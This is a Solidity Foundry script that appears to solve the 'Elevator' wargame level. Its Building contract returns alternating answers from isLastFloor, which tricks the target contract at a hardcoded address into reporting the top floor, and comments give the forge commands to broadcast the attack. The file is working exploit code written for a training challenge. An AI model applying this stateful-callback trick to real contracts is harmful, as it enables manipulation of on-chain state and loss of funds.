// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";

contract Building {
    Elevator public elevator =
        Elevator(payable(0x6830224C622240E9BAb8E7E0983a16ceE005BCeF));
    bool private toggle;
    function attack() external {
        elevator.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }
}

contract ElevatorHack is Script {
    Building building = new Building();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        building.attack();

        vm.stopBroadcast();
    }
}

// forge script script/Elevator.s.sol -vv --tc ElevatorHack
// forge script script/Elevator.s.sol -vv  --broadcast
